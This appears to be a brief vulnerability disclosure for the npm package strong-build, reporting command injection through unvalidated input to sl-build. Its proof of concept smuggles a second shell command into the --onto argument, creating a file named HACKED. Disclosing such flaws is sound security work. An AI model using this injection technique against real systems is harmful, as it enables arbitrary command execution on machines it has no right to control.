# Description

The `strong-build` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Check there aren't files called `HACKED` 
2. Execute the following commands in another terminal:

```bash
npm i strong-build -g # Install affected module
sl-build --onto '";touch HACKED; #' #  Run the PoC
```
3. Recheck the files: now `HACKED` has been created
